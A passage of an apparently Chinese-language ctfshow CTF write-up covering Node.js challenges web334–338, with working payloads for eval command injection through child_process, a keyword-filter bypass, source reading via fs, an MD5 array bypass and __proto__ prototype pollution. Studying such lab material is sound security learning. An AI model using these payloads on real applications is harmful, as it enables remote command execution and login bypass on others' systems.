          res.json({ret_code: 0, ret_msg: '登录成功',ret_flag:flag});              
        });
      }else{
        res.json({ret_code: 1, ret_msg: '账号或密码错误'});
      }  
    });
    module.exports = router;
其中
    var findUser = function(name, password){
      return users.find(function(item){
        return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;
      });
    };
CTFSHOW 为name，经过name.toUpperCase()处理后变大写。所以此处如果想让用户名为CTFSHOW，就需要控制输入为ctfshow。  
所以最后输入用户名为ctfshow 密码为：123456  
即可登陆成功getflag
####  web335
参考博客   
注释为`/eval`  
`eval`是为执行命令的关键词，所以这里猜想是可以进行命令执行。  
所以就去`/javascripts/jquery.js`中查找`eval`的语句，但是没get到点。所以看了大师傅的博客，得到了思路。
做的题少就是不行。  
然后师傅给了两个payload。
> require( “child_process” ).spawnSync( ‘ls’, [ ‘/‘ ] ).stdout.toString()  
>  require( “child_process” ).spawnSync( ‘cat’, [ ‘f*’ ] ).stdout.toString()
child_process(子进程)  
该模块提供了衍生子进程（以一种与popen(3)类似但不相同的方式）的能力。此功能主要是由 `child_process.spawn()`函数提供。  
此处使用同步进程：三个方法，他们会阻塞NodeJS事件循环、暂停任何其他代码的执行，知道衍生的进程退出。  
`child_process.spawnSync()`、`child_process.execSync()` 和
`child_process.execFileSync()`  
这里学习了两个方法可以用来解答这道题。具体的我将其记录在了NodeJS学习分组文章Day1  
这里直接进行
#####  第一种方法
然后cat fl00g.txt即可
还有就是上面那个payload了  
总：
> first  
>  require( “child_process” ).spawnSync( ‘ls’, [ ‘/‘ ] ).stdout.toString()  
>  require( “child_process” ).spawnSync( ‘cat’, [ ‘f*’ ] ).stdout.toString()  
>  second  
>  require(“child_process”).execSync(‘ls’)  
>  require(“child_process”).execSync(‘cat fl00g.txt’)
#####  第二种方法
参考群里Y4师傅的博客
> global.process.mainModule.constructor._load(‘child_process’).exec(‘calc’)
>
> ####  web336
>
> ?eval=require(“child_process”).spawnSync(‘ls’).stdout.toString()  
>  ?eval=require( ‘child_process’ ).spawnSync( ‘cat’, [ ‘fl001g.txt’ ]
> ).stdout.toString()
直接使用这个就可以，但是，我用另一个方法时，发现了过滤。
这里发现使用335的另外两种方法都不行，然后看Y4师傅的姿势，  
这里是由好多方法，整理了一下，为方便理解，由易到难来记录。
#####  第一种
读取文件，通过全局变量读取当前目录位置  
`__filename`  
然后查找资料看看还有什么其他的全局变量  
`__dirname` 表示当前执行脚本所在的目录。  
1、`global`: nodejs中的顶层对象，相当于前端js的window  
2、`__dirname`: 超全局变量/魔术变量，用于获取当前执行文件的所在目录  
3、`__filename`: 超全局变量/魔术变量，用于获取当前执行文件的绝对路径  
查看当前文件的绝对路径。
然后可以看到文件名，然后读取当前目录下的内容。
使用`fs.readdirSync()`
发现了fl001g.txt  
直接读取该文件
#####  第二种
然后根据大佬思路，读取该文件的源码，看看是过滤了什么内容。
payload为
    ?require("fs").readFileSync('/app/routes/index.js','utf-8')
源码：
    var express = require('express'); 
    var router = express.Router(); /* GET home page. */ 
    router.get('/', function(req, res, next) { 
      res.type('html'); 
      var evalstring = req.query.eval; 
      if(typeof(evalstring)=='string' && evalstring.search(/exec|load/i)>0){ 
        res.render('index',{ title: 'tql'}); 
      }else{ res.render('index', { title: eval(evalstring) }); 
    } 
    });
    module.exports = router;
可以看出是在 if(typeof(evalstring)==’string’ && evalstring.search(/exec|load/i)>0){  
这里进行过滤，过滤了exec和load，进行编码绕过
在本地测试后发现是可以进行拼接的。  
在浏览器中，+会被解析成空格，所以要先将+进行编码。
    require("child_process")['exe'%2B'cSync']('ls')
#####  第三种
直接使用
> require( “child_process” ).spawnSync( ‘ls’, [ ‘.’ ] ).stdout.toString()  
>  require( “child_process” ).spawnSync( ‘cat’, [ ‘fl00g.txt’ ]
> ).stdout.toString()
这个方法正好不在过滤范围内。可以直接使用。
####  web337
    var express = require('express');
    var router = express.Router();
    var crypto = require('crypto');
    function md5(s) {
      return crypto.createHash('md5')
        .update(s)
        .digest('hex');
    }
    /* GET home page. */
    router.get('/', function(req, res, next) {
      res.type('html');
      var flag='xxxxxxx';
      var a = req.query.a;
      var b = req.query.b;
      if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){
        res.end(flag);
      }else{
        res.render('index',{ msg: 'tql'});
      }
    });
    module.exports = router;
这里使用数组绕过MD5比较，还有a和b的长度比较。
最后输出都是`[object Object]flag{xxx}`  
所以可以使用数组来绕过。  
paylaod：`a[x]=1&b[x]=2`
####  web338(原型链污染)
这个是一道入门题目，源码都给了，在源码中查看，找到了login.js，发现了getflag的关键处。
    /* GET home page.  */
    router.post('/', require('body-parser').json(),function(req, res, next) {
      res.type('html');
      var flag='flag_here';
      var secert = {};
      var sess = req.session;
      let user = {};
      utils.copy(user,req.body);
      if(secert.ctfshow==='36dboy'){
        res.end(flag);
      }else{
        return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  
      }
    });
    //copy函数
    function copy(object1, object2){
        for (let key in object2) {
            if (key in object2 && key in object1) {
                copy(object1[key], object2[key])
            } else {
                object1[key] = object2[key]
            }
        }
      }
`utils.copy(user,req.body);`利用这里可实现原型链污染，使得`secret`继承`Object.prototype`
payload:`{"username":"admin","password":"pass","__proto__":{"ctfshow":"36dboy"}}`  
secret继承了这里的ctfshow的值，所以就刚好使得if语句为true，登录成功。
## 总结
因为是从零基础开始学的NodeJS，所以零碎的基础知识有点多。
## 参考链接